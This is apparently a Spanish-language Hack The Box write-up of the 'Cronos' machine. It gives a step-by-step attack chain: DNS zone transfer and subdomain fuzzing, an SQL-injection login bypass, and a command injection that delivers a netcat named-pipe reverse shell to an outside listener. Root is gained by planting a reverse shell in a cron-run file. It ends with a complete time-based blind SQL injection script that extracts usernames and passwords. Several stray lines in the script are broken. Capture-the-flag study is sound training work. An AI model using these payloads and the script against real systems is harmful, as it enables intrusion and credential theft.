---
title: "Cronos - WriteUp"
date: Sat Aug 23 2025 09:45:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, reverse-shell, impacket, linpeas, exploit, wfuzz, pspy, apache]
image: /assets/img/htb-writeups/Pasted image 20240202171303.png
---

{% include machine-info.html
  machine="Cronos"
  os="Linux"
  difficulty="Medium"
  platform="HTB"
%}

![Cronos](/assets/img/htb-writeups/Pasted image 20240202171303.png)

---

---

Tags: 

----

![CRONOS](/assets/img/htb-writeups/Pasted image 20240202171303.png)

#### Acerca de Cronos:

CronOS se centra principalmente en diferentes vectores de enumeración y también enfatiza los riesgos asociados con la adición de archivos grabables en todo el mundo al crontab raíz. Esta máquina también incluye una vulnerabilidad de inyección SQL de nivel introductorio.

--------

NMAP

```bash
# Nmap 7.94SVN scan initiated Mon Feb  5 11:54:34 2024 as: nmap -sCV -p 22,53,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootst
rap.xsl -oN targeted -oX targetedXML 10.129.227.211
Nmap scan report for 10.129.227.211
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hacemos fuzzing a la IP y no encontramos gran cosa.

Como tenemos el servicio DNS expuesto por el puerto 53 vamos a intentar averiguar el dominio del virtual hosting.

```bash
$ nslookup

> server 10.129.227.211
Default server: 10.129.227.211
Address: 10.129.227.211#53

> 10.129.227.211
211.227.129.10.in-addr.arpa	name = ns1.cronos.htb.
```

Y efectivamente encontramos que hace un virtual hosting a _cronos.htb_

Lo damos de alta en el archivo hosts y probamos de conectarnos por http.

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205123937.png)

Y efectivamente, podemos acceder a la web. 

Está programada con el Framework _Laravel_

`Laravel es un framework de código abierto para desarrollar aplicaciones y servicios web con PHP 5, PHP 7 y PHP 8. Su filosofía es desarrollar código PHP de forma elegante y simple, evitando el "código espagueti". Fue creado en 2011 y tiene una gran influencia de frameworks como Ruby on Rails, Sinatra y ASP.NET MVC.`​

Vamos a hacer fuzzing de subdominios.

```bash
$ wfuzz -c -f sub-domains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 11439 -u 'http://cronos.htb' -H "Host: FUZZ.cronos.htb"

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://cronos.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                            =====================================================================
000000001:   200        85 L     137 W      2319 Ch     "www"                                                                              000000024:   200        56 L     139 W      1547 Ch     "admin"                                                                            

Total time: 30.26690
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 164.8335
```

-----
#### NOTA:
Otra manera de haber descubierto los subdominios es mediante un ataque de transferencia de zona (sólo en el caso de que sea vulnerable):

```bash
$ dig @10.129.227.211 cronos.htb axfr

; <<>> DiG 9.19.19-1-Debian <<>> @10.129.227.211 cronos.htb axfr
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 43 msec
;; SERVER: 10.129.227.211#53(10.129.227.211) (TCP)
;; WHEN: Mon Feb 05 13:12:04 CET 2024
;; XFR size: 7 records (messages 1, bytes 203)
```

-----

Damos de alta los subdominios en hosts y seguimos...

```http
http://admin.cronos.htb/
```

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205125435.png)

Probamos una inyección SQL sencilla 

En Username: `' or 1=1--` 
En Password: `password`

Y nos muestra esta página:

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205125722.png)

Si nos ponemos en escucha con impacket la web nos responde:

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205130156.png)

```bash
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:58:40.322939 IP ns1.cronos.htb > 10.10.14.61: ICMP echo request, id 2699, seq 1, length 64
12:58:40.322964 IP 10.10.14.61 > ns1.cronos.htb: ICMP echo reply, id 2699, seq 1, length 64
```

Al ver que responde podemos pensar que la web es vulnerable al command injection. Vamos a probar con un _whoami_

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205131901.png)

Pues parece que sí, pues vamos a intentar enviarnos una consola remota:

Nos ponemos a la escucha con netca o penelope por el puerto que queramos y ejecutamos el comando:

```
10.10.14.61; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.61 4444 >/tmp/f
```

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205132214.png)

Le pasamos linpeas y pspy y vemos una tarea que ejecuta root cada minuto.

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205143944.png)

Vemos que podemos escribir en él

```bash
$ nano /var/www/laravel/artisan
```

Y le incrustamos un reverse shell para cuando se ejecute como root nos envíe la consola de superusuario.

![CRONOS](/assets/img/htb-writeups/Pasted image 20240205144133.png)

Muy fácil la escalada. Esta máquina no tiene nada de media. Más bien es una máquina EASY.

Script para sacar la contraseña:

```python
#!/usr/bin/python3

from pwn import *
import requests, time, string, pdb, signal

def def_handler(signum, frame):
    print("\n\n[!] Exiting...\n")
    exit(1)

+C
signal.signal(signal.SIGINT, def_handler)

# Global Variables
login_url = "http://admin.cronos.htb/index.php"
characters = string.ascii_lowercase + string.digits + ":"

def exploitUser():
    found_chars = ""
    
    p1 = log.progress("Discovering user...")

    time.sleep(2)

    for position in range(1, 10):
        for character in characters:
            post_data = {
                'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
                'password': 'admin'
            }

            .status(post_data["username"])

            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                found_chars += character
                p1.status(found_chars) 
                break

def exploitTables():
    table_name = ""

    p2 = log.progress("Discovering tables...")

    time.sleep(2)

    for table in range(0, 5):
        for position in range(1, 10):
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    table_name += character
                    p2.status(table_name) 
                    break

def exploitColumns():
    columns_name =[]

    p3 = log.progress("Discovering columns...")

    time.sleep(2)

    for columns in range(0, 5):
        column = ""
        for position in range(1, 50):
            for character in characters:
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (columns, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    column += character
                    if columns_name:
                        p3.status(', '.join(columns_name) + ', ' + column)
                    else:
                        p3.status(column)
                    break
        columns_name.append(column)

def exploitData():
    data = ""

    p4 = log.progress("Extracting data...")

    time.sleep(2)
    
    for position in range(1, 50):
        for character in characters:
            
            post_data = {
                'username': "admin' and if(substr((select group_concat(username,0x3a,password) from users),%d,1)='%c',sleep(5),1)-- -" % (position, character),
                'password': 'admin'
            }

            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                data += character
                p4.status(data)
                break

if __name__ == "__main__":
    exploitUser()
    exploitTables()
    exploitColumns()
    exploitData()
```
---

**Última actualización**: 2025-08-23<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
